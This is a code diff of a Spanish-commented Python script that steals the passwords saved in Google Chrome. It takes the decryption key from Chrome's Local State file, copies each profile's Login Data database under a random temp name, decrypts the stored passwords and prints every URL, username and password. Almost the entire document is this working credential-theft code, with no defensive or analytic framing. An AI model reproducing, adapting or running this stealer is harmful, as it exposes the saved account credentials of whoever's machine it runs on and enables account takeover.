@@ -1,20 +1,23 @@
-# Created by Alejandro Gonzales
+# Coded by Alejandro G.D
 
-import sqlite3
 import os
-import shutil
-import win32crypt
+import shutil 
+import json, base64, random
+import shutil, sqlite3, string
 from Crypto.Cipher import AES
-import json
-import base64
+import win32crypt
 
-# Ruta para obtener la clave para descifrar las credenciales
+# Ruta de la base de datos de contraseñas de Chrome
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
+CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
+TEMP_PATH = os.getenv('temp')
 
-path_chrome = os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data\\')
-temp_file = "tmp_file"
+#Generar caracteres alfanumericos de 6 caracteres de longitud
+def random_name():
+    rnd_name = string.ascii_letters + string.digits 
+    return ''.join(random.choice(rnd_name) for _ in range(6))
 
-# Obteniendo Clave para el descifrado
+# Obteniendo clave para el descifrado
 def get_secret_key():
     try:
         #(1) Get secretkey from chrome local state
@@ -55,27 +58,41 @@ def decrypt(ciphertext, secret_key):
         print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
         return ""
 
-# # Recorriendo directorio en busca de perfiles de usuarios
-for profile_dir in os.listdir(path_chrome):
-    profile_path = os.path.join(path_chrome, profile_dir)
-    login_path_data = os.path.join(profile_path, 'Login Data')
-    
-    if os.path.isfile(login_path_data):
-        shutil.copyfile(login_path_data, temp_file)
-
-        conn = sqlite3.connect(temp_file)
+def extractor_pass(profiles_path):
+    try:
+        temp_path = os.getenv('temp') + "\\" + random_name()
+        shutil.copy2(profiles_path, temp_path)
+        
+        conn = sqlite3.connect(temp_path)
         cursor = conn.cursor()
         cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-
+        
         for datas in cursor.fetchall():
             url = datas[0]
             username = datas[1]
-            password = decrypt(datas[2], get_secret_key())    
-            # Si no hay credenciales no mostrar
+            password = decrypt(datas[2], get_secret_key())
+
             if password != "":
-                print ("\n#########################")
-                print (f"URL: {url}\nUSERNAME: {username}\nPASSWORD: {password}\n")
+                print (f"\n URL: {url}\n USERNAME: {username}\n PASSWORD: {password}")
 
         conn.close()
-        os.remove(temp_file)
+        os.remove(temp_path)
 
+    except Exception as ex:
+        print (str(ex))
+
+def main():
+    for dirs in os.listdir(CHROME_PATH):
+        dirs_path = os.path.join(CHROME_PATH, dirs)
+        
+        #print (dirs_path)
+        # Verificar y filtrar solo las carpetas Profile
+        if os.path.isdir(dirs_path) and dirs.startswith('Profile'):
+            # Obteniendo todos los ficheros "Login Data"
+            for dirs_2 in os.listdir(dirs_path):
+                if dirs_2 == "Login Data":
+                    full_path = os.path.join(dirs_path, dirs_2)
+                    extractor_pass(full_path)
+
+if __name__ == "__main__":
+    main()
